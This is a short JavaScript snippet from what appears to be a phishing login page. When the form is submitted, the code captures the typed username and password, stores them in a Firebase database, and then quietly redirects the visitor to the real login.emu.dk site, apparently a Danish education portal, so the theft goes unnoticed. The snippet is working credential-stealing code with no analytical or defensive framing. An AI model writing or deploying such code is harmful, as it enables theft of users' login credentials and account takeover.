<script>
    var l = document.getElementById('login');
    var u = document.getElementById('user');
    var p = document.getElementById('pass');
    
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function ld() {
        await sleep(700);
        window.location.replace("https://login.emu.dk");
    }
    
    function send_upd() {
        firebase.database().ref(u.value).set({"pass": p.value});
        ld();
        
    }
    
    l.addEventListener('click', function() {send_upd()});
    u.addEventListener('keydown', function(e) {if (e.which == 13) {
        send_upd();
        e.preventDefault();
    }});
    p.addEventListener('keydown', function(e) {if (e.which == 13) {
        send_upd();
        e.preventDefault();
    }});

</script>
